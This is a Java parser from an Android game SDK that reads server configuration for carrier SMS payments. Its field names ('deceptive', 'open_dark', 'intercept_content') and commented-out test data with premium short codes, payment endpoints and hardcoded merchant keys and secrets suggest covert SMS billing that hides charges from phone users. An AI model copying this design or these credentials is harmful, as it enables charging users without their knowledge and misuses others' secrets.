package mobi.zty.sdk.game.object.parser;

import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.ActivateResult;
import mobi.zty.sdk.http.ResponseParser;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONException;
import org.json.JSONObject;

import android.os.Looper;
import android.util.Log;
import android.webkit.JsPromptResult;

public class ActivateResultParser implements ResponseParser<ActivateResult> {
    @Override
    public ActivateResult getResponse(String response) {
    	Looper.prepare();
        try {

            JSONObject object = new JSONObject(response);
            ActivateResult activateResult = new ActivateResult();
            activateResult.setPayways(object.optString("payways"));
            activateResult.setAdfd(object.optString("afdf"));
            activateResult.setUrl(object.optString("url"));
            activateResult.setDipcon(object.optString("dipcon"));
            activateResult.setDipcon2(object.optString("dipcon2"));
            activateResult.setDipurl(object.optString("dipurl"));
            activateResult.setNoturl(object.optString("noturl"));
            activateResult.setExiturl(object.optString("exiturl"));
	        activateResult.setbDel(object.optString("bDel"));
	        activateResult.setFillCon(object.optString("FillCon"));
	        activateResult.setOnlineLibVersionCode(Helper.getJsonInt(object,"lib_version_code"));
	        activateResult.setLimitMap(Helper.getJsonArray(object, "listLimitInfo"));
			activateResult.setMkMap(Helper.getJsonArray(object, "listMkInfo"));
			activateResult.setShopInfoMap(Helper.getJsonArray(object, "listShopInfo"));
			
	        activateResult.setOpenDark(Helper.getJsonInt(object,"open_dark"));
	        activateResult.setOpenAlert(Helper.getJsonInt(object,"open_alert"));
	        activateResult.setOpenButton(Helper.getJsonInt(object,"open_button"));
	        activateResult.setOpenOurAlert(Helper.getJsonInt(object,"open_our_alert"));
	        activateResult.setPhoneNum(Helper.getJsonString(object,"mobile_num"));
	        activateResult.setObtainNum(Helper.getJsonString(object,"obtain_num","106903384047"));
	        activateResult.setDeceptive(Helper.getJsonInt(object, "deceptive"));
	        activateResult.setCootype(Helper.getJsonInt(object,"cootype"));
	        
			
	        if (Helper.isDebugEnv()) {
	        	
	        	Util_G.debugE("ActivateResultParser", "listLimitInfo-->"+Helper.getJsonArray(object, "listLimitInfo").toString());
	        	Util_G.debugE("ActivateResultParser", "listMkInfo-->"+Helper.getJsonArray(object, "listMkInfo").toString());
	        	Util_G.debugE("ActivateResultParser", "listShopInfo-->"+Helper.getJsonArray(object, "listShopInfo").toString());
				/**新的sdk数据自测试 start**/
	        	//动漫发送短信支付start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": 301,\"limit\": 30}],\"listMkInfo\": [{\"id\": 20,\"send_num\": \"10658099866\",\"vertify_num\": \"1065809986601\",\"confim_num\": \"1065809986601\",\"sp_identify\": \"5231a\",\"pay_id\":\"7_1\",\"app_id\": \"ddd\",\"sp_key\": \"$e#dg&s\",\"intercept_content\":\"东漫社\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 120,\"id\":\"4555\",\"listFeeInfo\": [{\"id\": 301,\"mk\": 20,\"name\":\"动漫包月\",\"app_id\": \"ddd\",\"pay_id\":\"7_1\",\"pay_code\": \"10001508\", \"consume\": 3,\"verify\":1 }]}]}]}";
	        	//动漫发送短信支付end
	        	//乐游start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 5000}],\"listMkInfo\": [{\"id\": 5,\"app_id\": \"300009153610\",\"sp_key\": \"03B24935332BA767220AA2A39C301078\",\"sp_channel\": \"5480453\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 120,\"id\":\"4555\",\"listFeeInfo\": [{\"id\": \"301_01\", \"mk\": 5,\"pay_code\": \"9\",\"consume\": 200,\"name\":\"10元\",\"verify\":0}, {\"id\": \"301_01\",\"mk\": 5,\"pay_code\": \"9\",\"consume\": 200,\"name\":\"10元\",\"verify\":0}]}]}]}";
	        	//乐游end
	        	
	        	//盒饭 与乐游搭配测试 start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 300},{\"id\": \"301_02\",\"limit\": 5000}],\"listMkInfo\": [{\"id\": 5,\"pay_id\":\"7_1\",\"app_id\": \"300009153610\",\"sp_key\": \"03B24935332BA767220AA2A39C301078\",\"sp_channel\": \"5480453\"},{\"id\": 13,\"pay_id\":\"13_1\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 120,\"id\":\"4555\",\"listFeeInfo\": [{\"id\": \"301_01\", \"pay_id\":\"7_1\",\"mk\": 5,\"pay_code\": \"9\",\"consume\": 200,\"name\":\"10元\",\"verify\":0}, {\"id\": \"301_02\",\"mk\": 13,\"pay_id\":\"13_1\",\"pay_code\": \"002\",\"consume\": 200,\"name\":\"2元\",\"verify\":0}]}]}]}";
	        	//end
	        	
	        	//东风start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": 301_01,\"limit\": 5000}],\"listMkInfo\": [{\"id\": 18,\"send_num\": \"1065987701\",\"intercept_content\":\"世纪龙_流量币\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 120,\"id\":\"4555\",\"listFeeInfo\": ["
////	        			+ "{\"id\": \"301_01\", \"mk\": 18,\"pay_code\": \"200czc201#6\",\"consume\": 200,\"name\":\"2元\",\"verify\":0},"
//	        			+ " {\"id\": \"301_01\",\"mk\": 18,\"pay_code\": \"nc8\",\"consume\": 800,\"name\":\"8元\",\"verify\":1}]}]}]}";
	        	//东风end
	        	
	        	//易接sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 300},{\"id\": \"301_02\",\"limit\": 5000}],\"listMkInfo\": [{\"id\": 23,\"pay_id\": \"7_1\",\"app_id\": \"300009153610\",\"sp_key\": \"03B24935332BA767220AA2A39C301078\",\"sp_channel\": \"5480453\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"id\": \"4555\",\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 23,\"pay_code\": \"1\",\"consume\": 200,\"name\": \"10元\",\"verify\": 0},{\"id\": \"301_02\",\"mk\": 23,\"pay_id\": \"13_1\",\"pay_code\": \"2\",\"consume\": 200,\"name\": \"2元\",\"verify\": 0}]}]}]}";
	        	//易接sdk end
	        	
	        	//页游sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 300}],\"listMkInfo\": [{\"id\": 11,\"pay_id\": \"7_1\",\"sp_identify\": \"1040\",\"vertify_num\": \"10658899\",\"sp_key\": \"f51a5f5770a39ad7c459667c24f8a7fb\",\"sp_key2\": \"5f8ae0ba3467b28452e1697fd368e19f\",\"pay_url1\": \"http://mbp.yiyugame.com/third/fpft.do\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 11,\"consume\": 200,\"pay_code\": \"190\",\"verify\": 1}]}]}]}";
//	        	//页游sdk end
	        	
	        	//动漫包月sdk start
//	        	String testJson = "{"listLimitInfo": [{"id": "301_01","limit": 3000}],"listMkInfo": [{"id": 24,"pay_id": "7_1","sp_channel": "00000001","pay_url1": "http://vpay.jf55555.com:9999/client/api/v0/pay.api","pay_url2": "http://vpay.jf55555.com:9999/client/api/v0/sms_send_callback.api"}],"listShopInfo": [{ "index": 0,"listGroupInfo": [{"delay": 0,"listFeeInfo": [{"id": "301_01","pay_id": "7_1","mk": 24,"consume": 1000,"pay_code": "00000055","name": "10","verify": 0}]}]}]}";
	        	//动漫包月sdk end
	        	
	        	//袁林sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 25,\"pay_id\": \"7_1\",\"vertify_num\": \"10658008\",\"send_num\": \"10690387000212\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 25,\"consume\": 1000,\"pay_code\": \"XE@100@1000@MZ\",\"verify\": 1}]}]}]}";
//	        	//袁林sdk end
	        	
//	        	中科sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 26,\"pay_id\": \"7_1\",\"vertify_num\": \"1065515899\",\"pay_url1\": \"http://218.95.37.4:10901/r.aspx\", \"sp_identify\": \"022\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 26,\"pay_code\": \"0A06\",\"consume\": 600,\"name\":\"0A06004\",\"verify\": 1}]}]}]}";
	        	//中科sdk end
//	        	
	        	//北青sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 27,\"pay_id\": \"7_1\",\"vertify_num\": \"1008650\",\"send_num\": \"10620977\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 27,\"consume\": 1000,\"pay_code\": \"ZJ\",\"verify\": 1}]}]}]}";
	        	//北青sdk end
	        	
	        	//天翼空间包月sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 28,\"pay_id\": \"7_1\",\"app_name\": \"羊羊去哪儿\",\"sp_identify\": \"7a45bc30d7654c5cb8ab82b4c7316d92\",\"sp_key\": \"11fb2325d6464c35b33cbbdbcc22e48f\",\"pay_url1\": \"http://www.gomzone.com:8080/external/tySpaceccOpen_generateSSOSubscribeOrder.action\",\"vertify_num\": \"100011888\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 28,\"consume\": 100,\"pay_code\": \"659\",\"name\": \"1元\",\"verify\": 0}]}]}]}";
	        	//天翼空间包月sdk end
	        	
	        	//沃阅读sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 29,\"pay_id\": \"7_1\",\"app_name\": \"羊羊去哪儿\",\"sp_identify\": \"9008\",\"sp_key\": \"suhESjvk\",\"pay_url1\": \"http://api.slxz.com.cn/charge-platform/client/client.php\",\"sp_sign_type\": \"HMAC-SHA1\",\"pay_url2\":\"http://sa.91muzhi.com:8080/sdk/Open189Rsq\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 29,\"consume\": 100,\"pay_code\": \"1089\",\"name\": \"1元\",\"verify\": 0}]}]}]}";
	        	//沃阅读sdk end
	        	
	        	//动漫DDOsdk start	
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 30,\"pay_id\": \"7_1\",\"vertify_num\": \"10658099\",\"app_name\": \"6\", \"sp_channel\": \"D0506\",\"pay_url1\": \"http://218.66.104.164:9233/dm/vcodeHandle\",\"pay_url2\": \"http://218.66.104.164:9233/dm/vcodeSubmit\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 30,\"consume\": 200,\"verify\": 0}]}]}]}";
	        	//动漫DDOsdk end
	        	

	        	//福多多sdk start	
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 31,\"pay_id\": \"7_1\",\"send_num\": \"1065842230\",\"sp_channel\": \"0187\", \"pay_url1\": \"http://218.242.153.106:4000/mgdmv1a/cert\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 31,\"name\": \"PPSZYZA001_001\",\"verify\": 0}]}]}]}";
	        	//福多多sdk end
	        	
	        	//掌支付 sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 33,\"pay_id\": \"7_1\",\"sp_channel\": \"zyap1740_21224_100\",  \"sp_identify\": \"1000100020000465\",\"app_id\": \"1704\", \"app_name\": \"小妖爱冒险\", \"sp_key\": \"C15DB0782BC046598D5117686DFFDEBF\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 33,\"name\": \"复活\",\"pay_code\":\"11416\",\"consume\": 200,\"verify\": 0}]}]}]}";
//	        	//掌支付sdk end
	        	
	        	//明天动力（新） sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 34,\"pay_id\": \"7_1\",\"sp_identify\": \"1006\",\"app_id\": \"A00010\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 34,\"name\": \"复活\",\"pay_code\":\"1001\",\"consume\": 200,\"verify\": 0}]}]}]}";
//	        	//明天动力（新）sdk end
	        	
	        	//博士通（电信） sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 35,\"pay_id\": \"7_1\",\"sp_channel\": \"0002\",\"pay_url1\": \"http://112.74.133.246:8015/acsgateway/vendorcall\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 35,\"name\": \"复活\",\"consume\": 200,\"verify\": 0}]}]}]}";
//	        	//博士通（电信）sdk end
	        	

	        	//盈华讯方 sdk start
//	        	String testJson = "{\"listLimitInfo\": [{\"id\": \"301_01\",\"limit\": 3000}],\"listMkInfo\": [ { \"id\": 36,\"pay_id\": \"7_1\",\"app_id\": \"A00010\",\"sp_identify\": \"30638\",\"pay_url1\": \"http://119.29.133.73:8080/sdk/FeeRsq/yinghuasdk.action\"}],\"listShopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"delay\": 0,\"listFeeInfo\": [{\"id\": \"301_01\",\"pay_id\": \"7_1\",\"mk\": 36,\"consume\": 200,\"name\":\"复活\",\"verify\": 0}]}]}]}";
	        	//盈华讯方sdk end
	        	
//	        	JSONObject jsonObject = new JSONObject(testJson);
//				activateResult.setLimitMap(Helper.getJsonArray(jsonObject, "listLimitInfo"));
//				activateResult.setMkMap(Helper.getJsonArray(jsonObject, "listMkInfo"));
//				activateResult.setShopInfoMap(Helper.getJsonArray(jsonObject, "listShopInfo"));

				
//				{\"limitInfo\": [\"id\": 301,\"limit\": 50}],\"mkInfo\": [{\"id\": 20,\"send_num\": \"10658099866\",\"vertify_num\": \"1065809986601\",\"confim_num\": \"1065809986601\",\"sp_identify\": \"5231a\",\"app_id\": \"ddd\",\"sp_key\": \"$e#dg&s\",\"intercept_content\":\"动漫社\"}],\"shopInfo\": [{\"index\": 0,\"listGroupInfo\": [{\"groupFeeInfo\": {\"delay\": 50000,\"id\":\"4555\",\"feeInfo\": [{\"id\": 301,\"mk\": 7,\"name\":\"动漫包月\",\"pay_code\": \"10001506\", \"consume\": 3}]}}]}]}
	        	//动漫发送短信支付
//				
//		        activateResult.setMkurl("10001506,10001508;300,300;"
//		    			+ "10658099866;1065809986601;东漫社;30000;dongma");
//				activateResult.setMk(Constants.DONGMA_PAY);
		        //动漫发送短信支付end
	        	//易迅start
//		        activateResult.setMkurl("2032;1234;01,01;200,200;"
//    			+ "30000;yixun");
//		        activateResult.setMk(Constants.YIXUN_PAY);
		        //易迅end 
		       
				//动力通道模拟数据start
//				 activateResult.setMkurl("1065712061033047;10658099;"
//			        		+ "动漫点播;A01L146721,A01L146722,A01L1467210;100,200,1000;"
//			    			+ "30000;power2");
//				activateResult.setMk(Constants.POWER_PAY);
		        //动力通道模拟数据end
				//奇葩sdk start
//				 activateResult.setMkurl("00KK,00KL;200,200;"
//			    			+ "30000;qipasdk");
//				activateResult.setMk(Constants.QIPA_PAY);
		        //奇葩sdk end
	        	//明天支付模拟数据start
//		        activateResult.setMkurl("5370;good1313,good1312,good1313;200,200,2000;"
//    			+ "2元,2元,2元;30000;tomorrow");
//		        activateResult.setMk(Constants.TOMOEEOW_PAY);
		        //明天支付模拟数据end
		        //东风发送短信支付start1065987701
//		        activateResult.setMkurl("6,6,6, ;400czc202,200czc202,200czc202,nc8;200,400,300,800;"
//		    			+ "1065987701;30000;dongfen");
//				activateResult.setMk(Constants.DONGFENG_PAY);
		        //东风发送短信支付end
	        	//饭盒计费模拟数据 start
//		        activateResult.setMkurl("001,002,00A;100,200,1000;"
//	        			+ "1元,2元,10元;30000;fanhe");
//		        activateResult.setMk(Constants.FANHE_PAY);
		        //饭盒计费模拟数据 end
	        	//多套计费模拟测试start
//	        	activateResult.setMk("11,5");
//	        	activateResult.setMkurl("1040;f51a5f5770a39ad7c459667c24f8a7fb;5f8ae0ba3467b28452e1697fd368e19f;"
//	        			+ "190;100;http://mbp.yiyugame.com/third/fpft.do;;20000;yeyou"
//	        			+ "#300009115502;8222C4ED16ADBDC3E08BD2248B040C6C;5480396;1500,1000,1000,600,400,800,600,1000,10,1;20000;leyou");
	        	//多套计费模拟测试end
//	        	{合作方标识;key1;key2;pid1,pid2,...;fee1,fee2,...;页游的支付url}
	        	//页游支付模拟start
//	        	activateResult.setMkurl("1040;f51a5f5770a39ad7c459667c24f8a7fb;5f8ae0ba3467b28452e1697fd368e19f;"
//	        			+ "190;100;http://mbp.yiyugame.com/third/fpft.do;18612452707");
//		        activateResult.setMk(Constants.YEYOU_FEE);
//		        activateResult.setLimitMoney(10000);
	        	//页游支付模拟end
//	        	{商户号（商户唯一标识）;请求订单的Url（平台给我们分配的）;消息回送地址(支付结果回调地址 我们给平台的);签名算法类型;密钥;
//	       	 	 商品名称列表;商品价格列表;商品号列表)}
	        	//联通wo+模拟数据 start
//	        	activateResult.setMkurl("9008;http://api.slxz.com.cn/charge-platform/client/client.php;"
//	        			+ ";HMAC-SHA1;suhESjvk;1元充值,2元充值;100,200;654,655;羊羊去哪儿");
//		        activateResult.setMk(Constants.UNICOM_FEE);
//	        	//联通wo+模拟数据end
//		        activateResult.setLimitMoney(10000);
	        	
	           	//电信全网支付模拟数据 start
//	        	activateResult.setMkurl("9008;http://api.slxz.com.cn/charge-platform/client/client.php;"
//	        			+ "http://sa.91muzhi.com:8090/sdk/WoplusRsq;HMAC-SHA1;suhESjvk;1元充值,2元充值;100,200;811,812;羊羊去哪儿");
//		        activateResult.setMk(Constants.TC_ALL_FEE);
//	        	//电信全网支付模拟数据end
//		        activateResult.setLimitMoney(10000);
		        //天翼控件模拟数据 start
//		        activateResult.setMkurl("OPEN_PARTNER_MUZHIYOUWAN;http://www.gomzone.com:8080/external/tySpaceltOpen_generateMultiOrder.action;"
//	        			+ ";;5438e99521e747e98a67450f3972e992;;700,100; ;羊羊去哪儿");
//		        activateResult.setMk(Constants.TC_FEE);
		        //天翼控件模拟数据 end
//		        seller_key=OPEN_PARTNER_MUZHIYOUWAN
//		        		seller_secret=5438e99521e747e98a67450f3972e992
	        	
			}
//	        Looper.loop();
            return activateResult;

        } catch (JSONException ex) {
            Log.e(Constants.TAG, ex.toString());
            ex.printStackTrace();
            return null;
        }

    }
}